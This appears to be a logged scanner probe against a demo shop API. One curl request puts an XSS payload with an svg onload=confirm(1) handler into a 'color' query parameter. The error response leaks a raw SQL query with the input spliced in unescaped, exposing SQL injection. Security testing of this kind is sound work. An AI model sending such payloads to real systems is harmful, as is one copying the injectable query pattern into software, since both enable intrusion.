@@ -1,0 +1,7 @@
+# command: timeout 20 curl -s -m 18 -o - -w '\nHTTP_STATUS:%{http_code}\nCTYPE:%{content_type}' 'https://duck-store.escape.tech/api/v1/products/filter/by-color?color=s5xe308f564%22%27%3E%3C%2Ftitle%3E%3C%2Fscript%3E%3Csvg+onload%3Dconfirm%281%29%3E'
+# exit_code: 0
+# ---
+
+{"detail":"Query error: (sqlalchemy.dialects.postgresql.asyncpg.ProgrammingError) <class 'asyncpg.exceptions.PostgresSyntaxError'>: syntax error at or near \"onload\"\n[SQL: SELECT * FROM products WHERE color LIKE '%s5xe308f564\"'></title></script><svg onload=confirm(1)>%' ORDER BY name]\n(Background on this error at: https://sqlalche.me/e/20/f405)"}
+HTTP_STATUS:400
+CTYPE:application/json
